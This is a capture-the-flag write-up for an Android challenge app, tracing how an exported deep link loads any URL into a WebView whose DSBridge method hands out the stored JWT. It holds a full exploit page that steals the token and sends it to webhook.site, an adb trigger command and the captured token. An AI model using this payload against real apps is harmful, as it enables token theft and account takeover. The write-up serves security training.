# TokenBleed CTF Write-up

The app contains a custom WebView activity that exposes a native bridge via DSBridge. A deep link allows an attacker-controlled URL to be loaded into the WebView. Any JavaScript on that page can call the bridge and retrieve the stored JWT.

## Reverse engineering highlights

### Deep link entry point

The app registers a deep link in `AndroidManifest.xml` for the scheme `mhlcrypto`. The launcher activity (`SplashActivity`) is exported and accepts the deep link:

```
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="mhlcrypto"/>
</intent-filter>
```

This is the externally triggerable entry point.

### Deep link handling and WebView load

`MainActivity` handles the deep link and forwards the `url` query parameter into `DWebViewActivity`:

**84:96:sources/com/mobilehackinglab/exchange/MainActivity.java**
```
if (Intrinsics.areEqual(intent.getAction(), "android.intent.action.VIEW")) {
    Uri data = intent.getData();
    if (Intrinsics.areEqual(data != null ? data.getScheme() : null, "mhlcrypto")) {
        Uri data2 = intent.getData();
        Intrinsics.checkNotNull(data2);
        if (!Intrinsics.areEqual("showPage", data2.getHost())
                || (queryParameter = data2.getQueryParameter("url")) == null) {
            return;
        }
        Intent intent2 = new Intent(this, (Class<?>) DWebViewActivity.class);
        intent2.putExtra("url_to_load", queryParameter);
        startActivity(intent2);
    }
}
```

`DWebViewActivity` loads **any** URL starting with `http`:

**31:65:sources/com/mobilehackinglab/exchange/DWebViewActivity.java**
```
String stringExtra = getIntent().getStringExtra("url_to_load");
...
binding.dwebview.addJavascriptObject(new JsApi(this), null);
if (stringExtra != null && StringsKt.startsWith$default(stringExtra, "http", false, 2, null)) {
    binding.dwebview.loadUrl(stringExtra);
} else {
    finish();
}
```

This means any attacker can send a deep link pointing to their own page and have it loaded in the app’s WebView.

### JavaScript bridge exposes the token

The bridge is defined in `JsApi`:

**24:33:sources/com/mobilehackinglab/exchange/JsApi.java**
```
@JavascriptInterface
public final void getUserAuth(Object args, CompletionHandler<Object> handler) {
    String token = new TokenManager(this.context).getToken();
    if (token != null) {
        handler.complete(new JSONObject(token));
    } else {
        handler.complete(new JSONObject().put("error", "No token found"));
    }
}
```

`getUserAuth()` returns the stored JWT from `TokenManager`, which persists it in encrypted shared preferences.

## Attack chain summary

1. Victim logs into the app once.
2. Attacker sends a deep link:
   ```
   mhlcrypto://showPage?url=https://hosted_page.com/bleed.html
   ```
3. App loads attacker-controlled `bleed.html` in `DWebViewActivity`.
4. JavaScript calls the bridge method `getUserAuth()`.
5. JWT is returned and exfiltrated to attacker.

## Exploit implementation

### Payload HTML (`bleed.html`)

This HTML uses the DSBridge call:

```html
<!doctype html>
<html>
<body>
<pre id="log"></pre>
<script>
function log(s){ document.getElementById("log").textContent += s + "\n"; }

window.dscb = 0;
window.dsBridge = {
  call: function (method, args, cb) {
    var payload = { data: (args === undefined ? null : args) };
    if (typeof cb === "function") {
      var cbName = "dscb" + (window.dscb++);
      window[cbName] = cb;
      payload._dscbstub = cbName;
    }
    var ret = _dsbridge.call(method, JSON.stringify(payload));
    try { return JSON.parse(ret || "{}").data; } catch(e) { return ret; }
  }
};

function exfil(res){
  var payload = encodeURIComponent(JSON.stringify(res));
  var url = "https://webhook.site/" + payload;
  location.href = url;
  try { fetch(url, {mode:"no-cors"}); } catch(e) {}
  var img = new Image();
  img.src = url;
}

log("JS running, _dsbridge=" + !!window._dsbridge);

setTimeout(function () {
  dsBridge.call("getUserAuth", {}, function (res) {
    log("callback: " + JSON.stringify(res));
    exfil(res);
  });
}, 500);
</script>
</body>
</html>
```

### Hosting the payload

I used GitHub Page for this.

GitHub Pages URL:
```
https://0xalmighty.github.io/tokenbleed/bleed.html
```

### Triggering the deep link

To make it easier, we can use `adb`:

```bash
adb shell am start -W \
  -n com.mobilehackinglab.exchange/.SplashActivity \
  -a android.intent.action.VIEW \
  -d "mhlcrypto://showPage?url=https://0xalmighty.github.io/tokenbleed/bleed.html"
```

The exploit returns:

```json
JS running, _dsbridge=true
callback: {"code":"0","data":{"authtoken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMiIsImVtYWlsIjoiMkAyLmNvbSIsImF1ZGl0X3JlZiI6Ik1ITHt3M2J2MWV3X2JyMWRnM19wd25lZF9nZ30iLCJ0aWVyIjoiU2lsdmVyIiwiaWF0IjoxNzY4NTA5MTgyLCJleHAiOjE3Njg1MTI3ODJ9.Ig1uj3Gid2_ZbRSYS5JCwBxHbmijCmE2x77Ea3S7ecg"}}
```

The JWT can then be used to impersonate the user to steal their account.

Decoded value for the flag:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "name": "2",
  "email": "2@2.com",
  "audit_ref": "MHL{w3bv1ew_br1dg3_pwned_gg}",
  "tier": "Silver",
  "iat": 1768509182,
  "exp": 1768512782
}
```



